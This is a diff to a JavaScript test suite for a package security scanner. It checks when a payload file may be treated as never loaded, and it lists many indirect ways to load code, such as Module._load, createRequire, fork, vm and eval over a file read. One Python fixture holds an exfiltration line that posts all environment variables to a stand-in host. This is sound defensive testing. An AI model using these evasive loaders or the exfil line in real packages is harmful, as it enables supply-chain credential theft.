@@ -293,7 +293,6 @@ describe("a dynamic loader keeps every file at full severity", () => {
       "literal requires",
       "require('./a');\nrequire(\"./b\");\nimport('./c.js');\nrequire(`./d`);\n",
     ],
-    ["a shim named require", "function require(name) {\n  return modules[name];\n}\n"],
     ["a call inside a string", "const help = 'call require(name) to load';\n"],
     ["a comment", "// require(name) loads it\n"],
     ["an extensions table on another object", "this._extensions = {};\nws.extensions = offer;\n"],
@@ -310,6 +309,19 @@ describe("a dynamic loader keeps every file at full severity", () => {
     ).toBe(true);
   });
 
+  test("a shim named require is no loader, but no longer proves loads static", async () => {
+    const staged = await parsed({
+      "package.json": manifest({ main: "index.js" }),
+      "index.js": "function require(name) {\n  return modules[name];\n}\n",
+      "x.min.js": EXFIL,
+    });
+    const { findings, ids } = review(staged);
+    expect(ids("index.js")).toEqual([]);
+    expect(
+      findings.filter((finding) => finding.file === "x.min.js" && finding.loadUnproven),
+    ).toEqual([]);
+  });
+
   test("a bundle's computed require with nothing unloaded to reach is quiet", async () => {
     const staged = await parsed({
       "package.json": manifest({ main: "index.js" }),
@@ -317,6 +329,126 @@ describe("a dynamic loader keeps every file at full severity", () => {
       "x.min.js": "module.exports = 1;\n",
     });
     expect(review(staged).findings).toEqual([]);
+  });
+});
+
+describe("demotion needs provably static loads", () => {
+  // Each loads the payload through a path nothing in the package spells out.
+  const target = (name) =>
+    `const path = require('path');\nconst p = path.join(__dirname, ${JSON.stringify([...name])}.join(''));\n`;
+  const read = "const fs = require('fs');\nconst src = fs.readFileSync(p, 'utf8');\n";
+  const shapes = [
+    ["require.main.require", "require.main.require(p);\n"],
+    ["process.mainModule.require", "process.mainModule.require(p);\n"],
+    ["a bracketed module.require", "module['require'](p);\n"],
+    ["a concatenated module.require", "module['req' + 'uire'](p);\n"],
+    ["require destructured off module", "const { require: ld } = module;\nld(p);\n"],
+    ["Module._load", "require('module')._load(p);\n"],
+    ["createRequire", "require('module').createRequire(__filename)(p);\n"],
+    ["require.call", "require.call(null, p);\n"],
+    ["require in an array", "const [ld] = [require];\nld(p);\n"],
+    ["require in an object", "const o = { require };\no.require(p);\n"],
+    ["child_process.fork", "require('child_process').fork(p);\n"],
+    ["a worker thread", "const wt = require('worker_threads');\nnew wt.Worker(p);\n"],
+    ["a bracketed vm call", `${read}require('vm')['runInThisContext'](src);\n`],
+    ["Function over a file read", `${read}Function(src)();\n`],
+    ["eval over a file read", `${read}eval(src);\n`],
+    ["spawning node", "require('child_process').spawn('node', [p]);\n"],
+    ["spawning argv[0]", "require('child_process').spawn(process.argv[0], [p]);\n"],
+    ["process.dlopen", "process.dlopen(module, p);\n"],
+  ];
+
+  test.each(
+    shapes.flatMap(([label, shape]) =>
+      ["x.txt", "x.min.js"].map((payload) => [label, payload, shape]),
+    ),
+  )("%s reaching %s: the exfil payload scores high", async (_label, payload, shape) => {
+    const previous = await parsed({
+      "package.json": manifest({ main: "index.js" }),
+      "index.js": "module.exports = 1;\n",
+    });
+    const staged = await parsed({
+      "package.json": manifest({ version: "1.0.1", main: "index.js" }),
+      "index.js": `${target(payload)}${shape}`,
+      [payload]: EXFIL,
+    });
+    const { findings, ids, releaseRisk } = review(staged, previous);
+    expect(findings.filter((finding) => finding.file === payload && finding.loadUnproven)).toEqual(
+      [],
+    );
+    expect(ids("index.js")).toContain("code.dynamic-load:high");
+    expect(releaseRisk).toBe("high");
+  });
+
+  test.each([
+    [
+      "literal requires and imports",
+      "const a = require('./a');\nimport('./c.js');\nmodule.exports = typeof require === 'function' && require.resolve('./b');\n",
+    ],
+    [
+      "a UMD guard",
+      "if (typeof module === 'object' && module.exports) module.exports = factory();\n",
+    ],
+    [
+      "Function.prototype",
+      "const call = Function.prototype.call;\nmodule.exports = (f) => f instanceof Function;\n",
+    ],
+    [
+      "prose and strings",
+      "// eval(src) and require(name) are not used here\nconst help = 'require(name)';\n",
+    ],
+  ])("%s keep demotion", async (_label, index) => {
+    const staged = await parsed({
+      "package.json": manifest({ main: "index.js" }),
+      "index.js": index,
+      "x.min.js": EXFIL,
+    });
+    const { findings } = review(staged);
+    const payload = findings.filter((finding) => finding.file === "x.min.js");
+    expect(payload.length).toBeGreaterThan(0);
+    expect(payload.every((finding) => finding.loadUnproven)).toBe(true);
+  });
+
+  test.each([
+    [
+      "an esbuild require shim",
+      "var __require = typeof require !== 'undefined' ? require : null;\n",
+    ],
+    ["eval anywhere", "module.exports = (s) => eval(s);\n"],
+    ["the vm builtin", "const vm = require('vm');\n"],
+    ["a native addon", null],
+  ])("%s disable demotion package-wide", async (_label, index) => {
+    const staged = await parsed({
+      "package.json": manifest({ main: "index.js" }),
+      "index.js": index ?? "module.exports = require('./build/addon.node');\n",
+      ...(index === null ? { "build/addon.node": new Uint8Array([0x7f, 0x45, 0x4c, 0x46]) } : {}),
+      "x.min.js": EXFIL,
+    });
+    const { findings } = review(staged);
+    expect(
+      findings.filter((finding) => finding.file === "x.min.js" && finding.loadUnproven),
+    ).toEqual([]);
+  });
+
+  test.each([
+    ["exec over a read", "exec(open(path).read())\n"],
+    ["importlib", "import importlib\nimportlib.import_module(name)\n"],
+    ["sys.path", "import sys\nsys.path.insert(0, here)\n"],
+  ])("Python %s disables demotion", async (_label, source) => {
+    const files = (module) => ({
+      "PKG-INFO": "Metadata-Version: 2.1\nName: pkg\nVersion: 1.0.0\n",
+      "pkg/__init__.py": module,
+      "pkg/data.txt":
+        "import os, urllib.request\nurllib.request.urlopen('https://collect.example.invalid', data=str(dict(os.environ)).encode())\n",
+    });
+    const unproven = async (module) => {
+      const staged = await parsed(files(module));
+      return deterministicFindings(staged, createPackageDiff([], staged), undefined, {
+        codePatternSet: "python",
+      }).filter((finding) => finding.file === "pkg/data.txt" && finding.loadUnproven);
+    };
+    expect((await unproven("VERSION = 1\n")).length).toBeGreaterThan(0);
+    expect(await unproven(source)).toEqual([]);
   });
 });
 
